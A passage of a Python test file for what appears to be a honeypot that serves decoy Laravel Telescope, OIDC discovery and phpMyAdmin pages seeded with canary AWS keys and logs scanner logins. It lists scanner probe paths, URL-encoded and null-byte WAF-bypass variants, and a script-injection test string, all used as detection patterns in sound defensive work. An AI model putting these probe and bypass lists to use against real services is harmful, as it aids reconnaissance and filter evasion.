    assert entry["telescopePath"] == "/telescope/requests"
    assert entry["telescopePanel"] == "requests"


async def test_dispatch_telescope_api_requests_embeds_canary(flux_client, monkeypatch):
    monkeypatch.setattr(tbenv, "API_KEY", "fake-key")
    monkeypatch.setattr(tbenv, "_get_or_issue_canary", _fake_canary)

    resp = await flux_client.get(
        "/telescope/telescope-api/requests",
        headers={"X-Forwarded-For": "203.0.113.141", "Host": "victim.example"},
    )
    assert resp.status == 200
    assert resp.headers.get("Content-Type", "").startswith("application/json")
    payload = json.loads(await resp.text())
    assert payload["entries"][0]["content"]["payload"]["AWS_ACCESS_KEY_ID"] == "AKIAFAKEEXAMPLE01"

    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "telescope-api-requests"
    assert entry["telescopePanel"] == "requests"
    assert "aws" in entry["canaryTypes"]


async def test_dispatch_telescope_api_admin_prefix_dispatches_same(flux_client, monkeypatch):
    """`/admin/telescope/api/requests` should hit the same handler and
    embed the AWS canary, matching the proxy-rewrite placement
    scanners walk in addition to the bare path."""
    monkeypatch.setattr(tbenv, "API_KEY", "fake-key")
    monkeypatch.setattr(tbenv, "_get_or_issue_canary", _fake_canary)

    resp = await flux_client.get(
        "/admin/telescope/api/requests",
        headers={"X-Forwarded-For": "203.0.113.142", "Host": "victim.example"},
    )
    assert resp.status == 200
    payload = json.loads(await resp.text())
    assert payload["entries"][0]["content"]["payload"]["AWS_ACCESS_KEY_ID"] == "AKIAFAKEEXAMPLE01"

    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "telescope-api-requests"


async def test_dispatch_telescope_api_unknown_panel_returns_404(flux_client):
    resp = await flux_client.get(
        "/telescope/telescope-api/no-such-panel",
        headers={"X-Forwarded-For": "203.0.113.143"},
    )
    assert resp.status == 404
    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "telescope-api-miss"
    assert entry["telescopePanel"] == "no-such-panel"


async def test_dispatch_telescope_api_known_no_credential_panel_returns_empty(flux_client):
    """Fingerprint-only panels (cache, redis, gates, …) return an empty
    entries[] and never burn an AWS canary — the SPA renders the same
    'no events captured' empty state a fresh install would show."""
    resp = await flux_client.get(
        "/telescope/telescope-api/cache",
        headers={"X-Forwarded-For": "203.0.113.144"},
    )
    assert resp.status == 200
    payload = json.loads(await resp.text())
    assert payload == {"entries": []}

    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "telescope-api-cache"
    assert entry["canaryTypes"] == []


async def test_dispatch_telescope_disabled_falls_through(flux_client, monkeypatch):
    """When TELESCOPE_ENABLED=False the dispatcher must NOT hit
    `_handle_telescope`. A `/telescope/requests` GET should bypass the
    handler entirely and the per-request log entry must not carry a
    `telescope-*` result tag."""
    monkeypatch.setattr(tbenv, "TELESCOPE_ENABLED", False)

    resp = await flux_client.get(
        "/telescope/requests",
        headers={"X-Forwarded-For": "203.0.113.145"},
    )
    # Falls into the tarpit / not-handled tail.
    if _log_entries(flux_client.log_path):
        entry = _log_entries(flux_client.log_path)[-1]
        assert not str(entry.get("result", "")).startswith("telescope")


# --- OIDC / OAuth discovery trap -----------------------------------------

def test_oidc_discovery_enabled_by_default():
    assert tbenv.OIDC_DISCOVERY_ENABLED


def test_oidc_discovery_path_matches_observed_probes():
    """Every prefix shape from the scanner-dictionary tail must route."""
    for path in (
        "/.well-known/openid-configuration",
        "/.well-known/openid_configuration",          # underscore typo
        "/.well-known/oauth-authorization-server",     # RFC-8414 sibling
        "/oauth/.well-known/openid-configuration",
        "/oauth2/.well-known/openid-configuration",
        "/oauth/idp/.well-known/openid-configuration",
        "/auth/.well-known/openid-configuration",
        "/auth/realms/master/.well-known/openid-configuration",
        "/auth/realms/myorg/.well-known/openid-configuration",
        "/realms/master/.well-known/openid-configuration",
        "/idp/.well-known/openid-configuration",
        # URL-encoded leading slash (scanner WAF-bypass variants)
        "/%2F.well-known/openid-configuration",
        "/%2f.well-known/openid-configuration",
        "/%252F.well-known/openid-configuration",
        # Noise suffixes (null-byte, .txt, ~ fuzz)
        "/.well-known/openid-configuration%00",
        "/.well-known/openid-configuration.txt",
        "/.well-known/openid-configuration~",
        # Cache-buster query strings
        "/.well-known/openid-configuration?v=1",
    ):
        assert tbenv.is_oidc_discovery_path(path), f"expected match: {path}"


def test_oidc_discovery_path_non_match():
    for path in (
        "/",
        "/index.html",
        "/.env",
        "/.well-known/security.txt",
        "/.well-known/jwks.json",
        "/openid-configuration",          # missing /.well-known/
        "/oauth/token",
        "/realms/master/account",
    ):
        assert not tbenv.is_oidc_discovery_path(path), f"unexpected match: {path}"


def test_oidc_discovery_disabled_returns_false(monkeypatch):
    monkeypatch.setattr(tbenv, "OIDC_DISCOVERY_ENABLED", False)
    assert not tbenv.is_oidc_discovery_path(
        "/.well-known/openid-configuration",
    )


def test_oidc_discovery_realm_extraction():
    assert tbenv._oidc_discovery_realm(
        "/auth/realms/master/.well-known/openid-configuration",
    ) == "master"
    assert tbenv._oidc_discovery_realm(
        "/realms/myorg/.well-known/openid-configuration",
    ) == "myorg"
    # Bare placement carries no realm.
    assert tbenv._oidc_discovery_realm(
        "/.well-known/openid-configuration",
    ) == ""
    # `/oauth/idp/...` is not a Keycloak realm shape.
    assert tbenv._oidc_discovery_realm(
        "/oauth/idp/.well-known/openid-configuration",
    ) == ""


def test_oidc_discovery_json_embeds_aws_canary_in_extension_slot():
    body = tbenv.render_oidc_discovery_json(
        FAKE_TRACEBIT, "idp.example", realm="master",
        is_oauth_sibling=False, version="24.0.5",
    )
    payload = json.loads(body)
    # Canary placement — the AKIA literal must land in the JSON body.
    assert payload["_aws_metadata_signing_key_id"] == "AKIAFAKEEXAMPLE01"
    assert payload["_aws_metadata_signing_secret"].startswith("wJalrXUt")
    # Standard OIDC fields present + issuer reflects realm.
    assert payload["issuer"] == "https://idp.example/realms/master"
    assert payload["token_endpoint"].endswith("/token")
    assert payload["userinfo_endpoint"].endswith("/userinfo")  # OIDC-only
    assert "id_token_signing_alg_values_supported" in payload
    assert "claims_supported" in payload


def test_oidc_discovery_json_oauth_sibling_drops_oidc_only_fields():
    body = tbenv.render_oidc_discovery_json(
        FAKE_TRACEBIT, "idp.example", realm="",
        is_oauth_sibling=True, version="24.0.5",
    )
    payload = json.loads(body)
    # RFC-8414 OAuth metadata documents don't carry OIDC-only fields.
    assert "userinfo_endpoint" not in payload
    assert "id_token_signing_alg_values_supported" not in payload
    assert "claims_supported" not in payload
    # But the OAuth core fields + canary are still present.
    assert payload["token_endpoint"].endswith("/token")
    assert payload["_aws_metadata_signing_key_id"] == "AKIAFAKEEXAMPLE01"
    # Bare placement → bare issuer.
    assert payload["issuer"] == "https://idp.example"


def test_oidc_discovery_json_no_fixed_credential_literals():
    """The trap must never ship the same secret across sensors. With an
    empty Tracebit response (no AWS canary issued), the credential slots
    must be empty strings — never a hardcoded literal."""
    body = tbenv.render_oidc_discovery_json(
        {}, "idp.example", realm="", is_oauth_sibling=False, version="24.0.5",
    )
    payload = json.loads(body)
    assert payload["_aws_metadata_signing_key_id"] == ""
    assert payload["_aws_metadata_signing_secret"] == ""
    assert payload["_aws_metadata_session_token"] == ""


async def test_dispatch_oidc_discovery_embeds_canary(flux_client, monkeypatch):
    monkeypatch.setattr(tbenv, "API_KEY", "fake-key")
    monkeypatch.setattr(tbenv, "_get_or_issue_canary", _fake_canary)

    resp = await flux_client.get(
        "/.well-known/openid-configuration",
        headers={"X-Forwarded-For": "203.0.113.151", "Host": "idp.example"},
    )
    assert resp.status == 200
    assert resp.headers.get("Content-Type", "").startswith("application/json")
    payload = json.loads(await resp.text())
    assert payload["_aws_metadata_signing_key_id"] == "AKIAFAKEEXAMPLE01"
    assert payload["issuer"] == "https://idp.example"

    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "oidc-discovery"
    assert entry["oidcDiscoveryKind"] == "openid-configuration"
    assert entry["oidcDiscoveryRealm"] == ""
    assert "aws" in entry["canaryTypes"]


async def test_dispatch_oidc_discovery_keycloak_realm_path(flux_client, monkeypatch):
    monkeypatch.setattr(tbenv, "API_KEY", "fake-key")
    monkeypatch.setattr(tbenv, "_get_or_issue_canary", _fake_canary)

    resp = await flux_client.get(
        "/auth/realms/master/.well-known/openid-configuration",
        headers={"X-Forwarded-For": "203.0.113.152", "Host": "idp.example"},
    )
    assert resp.status == 200
    payload = json.loads(await resp.text())
    assert payload["issuer"] == "https://idp.example/realms/master"
    # Token endpoint should reflect the realm structure.
    assert "/realms/master/protocol/openid-connect/token" in payload["token_endpoint"]

    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "oidc-discovery"
    assert entry["oidcDiscoveryRealm"] == "master"


async def test_dispatch_oidc_discovery_oauth_sibling_variant(flux_client, monkeypatch):
    monkeypatch.setattr(tbenv, "API_KEY", "fake-key")
    monkeypatch.setattr(tbenv, "_get_or_issue_canary", _fake_canary)

    resp = await flux_client.get(
        "/.well-known/oauth-authorization-server",
        headers={"X-Forwarded-For": "203.0.113.153", "Host": "idp.example"},
    )
    assert resp.status == 200
    payload = json.loads(await resp.text())
    # RFC-8414 — no OIDC-only fields.
    assert "userinfo_endpoint" not in payload
    assert "claims_supported" not in payload
    assert payload["token_endpoint"].endswith("/token")
    assert payload["_aws_metadata_signing_key_id"] == "AKIAFAKEEXAMPLE01"

    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["oidcDiscoveryKind"] == "oauth-authorization-server"


async def test_dispatch_oidc_discovery_url_encoded_slash_prefix(flux_client, monkeypatch):
    """`/%2F.well-known/...` is a common scanner WAF-bypass variant — it
    must collapse to the canonical path and route to the same handler."""
    monkeypatch.setattr(tbenv, "API_KEY", "fake-key")
    monkeypatch.setattr(tbenv, "_get_or_issue_canary", _fake_canary)

    resp = await flux_client.get(
        "/%2F.well-known/openid-configuration",
        headers={"X-Forwarded-For": "203.0.113.154", "Host": "idp.example"},
    )
    assert resp.status == 200
    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "oidc-discovery"


async def test_dispatch_oidc_discovery_disabled_falls_through(flux_client, monkeypatch):
    monkeypatch.setattr(tbenv, "OIDC_DISCOVERY_ENABLED", False)
    resp = await flux_client.get(
        "/.well-known/openid-configuration",
        headers={"X-Forwarded-For": "203.0.113.155"},
    )
    if _log_entries(flux_client.log_path):
        entry = _log_entries(flux_client.log_path)[-1]
        assert entry.get("result") != "oidc-discovery"


async def test_dispatch_oidc_discovery_no_api_key_skips_trap(flux_client, monkeypatch):
    """Without TRACEBIT_API_KEY the trap must not claim the path —
    every other canary-backed trap follows this convention so the
    keyless smoke deployment doesn't emit credential-shaped 200s with
    empty AKIA fields that would burn the deception on first hit."""
    monkeypatch.setattr(tbenv, "API_KEY", "")
    resp = await flux_client.get(
        "/.well-known/openid-configuration",
        headers={"X-Forwarded-For": "203.0.113.156"},
    )
    if _log_entries(flux_client.log_path):
        entry = _log_entries(flux_client.log_path)[-1]
        assert entry.get("result") != "oidc-discovery"


# --- Fake phpMyAdmin login trap ------------------------------------------

def test_phpmyadmin_enabled_by_default():
    assert tbenv.PHPMYADMIN_ENABLED


@pytest.mark.parametrize("path", [
    # Canonical install dirs (the four highest-volume misses in the
    # corpus walkthrough that motivated the trap).
    "/phpmyadmin/",
    "/phpMyAdmin/",
    "/PMA/",
    "/pma/",
    "/myadmin/",
    "/phpmyadmin",
    # Deep paths scanner dictionaries walk inside the install dir.
    "/phpmyadmin/index.php",
    "/phpMyAdmin/index.php",
    "/PMA/index.php",
    "/myadmin/index.php",
    "/phpmyadmin/sql.php",
    "/phpmyadmin/setup/index.php",
    "/PMA/setup/",
    # Less-common aliases that still show up in dictionaries.
    "/dbadmin/",
    "/mysql/",
    "/mysqladmin/",
    "/sqladmin/",
    "/admin/phpmyadmin/",
    "/admin/pma/",
    "/web/phpmyadmin/",
    # Per-version directories — scanners blindly walk every minor
    # release suffix because some installs leave them in place.
    "/phpmyadmin4.8.1/",
    "/phpmyadmin-5.2.1/",
    "/phpMyAdmin4.7.0/",
    "/PMA2018/",
    "/pma_5.2/",
    # Deep paths under per-version directories — the regex used to
    # stop at `/?$` and let `/phpMyAdmin-2/index.php` fall through.
    "/phpMyAdmin-2/index.php",
    "/phpmyadmin2/index.php",
    "/phpMyAdmin2/sql.php",
    "/PMA2018/setup/",
    # Hyphenated-base aliases scanner dictionaries fan out across.
    "/php-my-admin/index.php",
    "/php-myadmin/index.php",
    "/mysql-admin/index.php",
])
def test_phpmyadmin_path_matches_observed_probes(path):
    assert tbenv.is_phpmyadmin_path(path), f"expected match: {path}"


@pytest.mark.parametrize("path", [
    "/",
    "/index.php",
    "/wp-login.php",
    "/admin/",
    "/phpunit/",
    "/phpinfo.php",
    "/db.sql",
    "/database.sql",
    # Word boundary — `/myadminpanel/` is not a PMA alias.
    "/myadminpanel/",
])
def test_phpmyadmin_path_non_match(path):
    assert not tbenv.is_phpmyadmin_path(path), f"unexpected match: {path}"


def test_phpmyadmin_disabled_returns_false(monkeypatch):
    monkeypatch.setattr(tbenv, "PHPMYADMIN_ENABLED", False)
    assert not tbenv.is_phpmyadmin_path("/phpmyadmin/index.php")


def test_phpmyadmin_login_html_no_fixed_credential_literals():
    """Per the flux design principle, every credential-shaped field must
    be per-hit unique. The login HTML carries a hidden form token + a
    session cookie; the token in the rendered body must be the one we
    pass in, not a hardcoded literal."""
    body_a = tbenv.render_phpmyadmin_login_html(version="5.2.1", token="aaaaaaaa")
    body_b = tbenv.render_phpmyadmin_login_html(version="5.2.1", token="bbbbbbbb")
    assert b'name="token" value="aaaaaaaa"' in body_a
    assert b'name="token" value="bbbbbbbb"' in body_b
    assert body_a != body_b


def test_phpmyadmin_login_html_echoes_submitted_user_safely():
    """On a re-render after a failed POST, the submitted username gets
    echoed back into the form field — real PMA does this, and it makes
    the trap look stateful. Reflected user input MUST be HTML-escaped."""
    body = tbenv.render_phpmyadmin_login_html(
        version="5.2.1", token="t", submitted_user='<script>x</script>',
    )
    assert b'&lt;script&gt;x&lt;/script&gt;' in body
    assert b'<script>x</script>' not in body


def test_phpmyadmin_extract_creds_records_no_plaintext_password():
    """We log the username + password length, never the password itself."""
    body = b"pma_username=root&pma_password=hunter2&server=1&token=abc"
    fields = tbenv.extract_phpmyadmin_creds(
        body, "application/x-www-form-urlencoded",
    )
    assert fields["pma_username"] == "root"
    assert fields["hasPwd"] == "true"
    assert fields["pwdLen"] == "7"
    assert fields["server"] == "1"
    assert fields["token"] == "abc"
    # Password value itself is not stored.
    assert "pma_password" not in fields


async def test_dispatch_phpmyadmin_get_renders_login(flux_client, monkeypatch):
    resp = await flux_client.get(
        "/phpmyadmin/",
        headers={"X-Forwarded-For": "203.0.113.200"},
    )
    assert resp.status == 200
    body = await resp.read()
    assert b'name="pma_username"' in body
    assert b'name="pma_password"' in body
    # Per-hit token + session cookie.
    cookie = resp.headers.get("Set-Cookie", "")
    assert cookie.startswith("phpMyAdmin=")
    assert "HttpOnly" in cookie
    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "phpmyadmin-login"
    assert entry["phpMyAdminMethod"] == "GET"
    assert entry["phpMyAdminPath"] == "/phpmyadmin/"
    assert entry["clientIp"] == "203.0.113.200"


async def test_dispatch_phpmyadmin_setup_probe_gets_distinct_result(flux_client):
    resp = await flux_client.get(
        "/phpmyadmin/setup/index.php",
        headers={"X-Forwarded-For": "203.0.113.201"},
    )
    assert resp.status == 200
    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "phpmyadmin-setup-probe"


async def test_dispatch_phpmyadmin_post_captures_credentials(flux_client):
    body = b"pma_username=admin&pma_password=correcthorsebatterystaple&server=1&token=xyz"
    resp = await flux_client.post(
        "/PMA/index.php",
        data=body,
        headers={
            "X-Forwarded-For": "203.0.113.202",
            "Content-Type": "application/x-www-form-urlencoded",
            "Cookie": "phpMyAdmin=oldsession",
        },
    )
    assert resp.status == 200
    page = await resp.read()
    # The error message renders on the re-served form.
    assert b"Cannot log in to the MySQL server" in page
    # And the submitted username is echoed back into the value attribute.
    assert b'value="admin"' in page
    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "phpmyadmin-credential-post"
    assert entry["phpMyAdminUsername"] == "admin"
    assert entry["phpMyAdminHasPwd"] is True
    assert entry["phpMyAdminPwdLen"] == "25"
    assert entry["phpMyAdminServer"] == "1"
    assert entry["phpMyAdminSessionCookiePresent"] is True


async def test_dispatch_phpmyadmin_disabled_falls_through(flux_client, monkeypatch):
    monkeypatch.setattr(tbenv, "PHPMYADMIN_ENABLED", False)
    resp = await flux_client.get(
        "/phpmyadmin/",
        headers={"X-Forwarded-For": "203.0.113.203"},
    )
    assert resp.status == 404
    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "not-handled"


async def test_dispatch_phpmyadmin_head_returns_empty_body(flux_client):
    resp = await flux_client.head(
        "/phpmyadmin/",
        headers={"X-Forwarded-For": "203.0.113.204"},
    )
    assert resp.status == 200
    body = await resp.read()
    assert body == b""
    # Content-Length still reflects the GET body size — same as real PMA.
    assert int(resp.headers.get("Content-Length", "0")) > 0
    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "phpmyadmin-login"
    assert entry["phpMyAdminMethod"] == "HEAD"


async def test_dispatch_phpmyadmin_no_api_key_still_serves(flux_client, monkeypatch):
    """Unlike the canary-backed traps, phpMyAdmin doesn't need the
    Tracebit API key — the trap captures already-submitted creds and
    issues no canary, so keyless deployments still get the credential-
    capture signal."""
    monkeypatch.setattr(tbenv, "API_KEY", "")
    resp = await flux_client.get(
        "/phpmyadmin/",
        headers={"X-Forwarded-For": "203.0.113.205"},
    )
    assert resp.status == 200
    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "phpmyadmin-login"
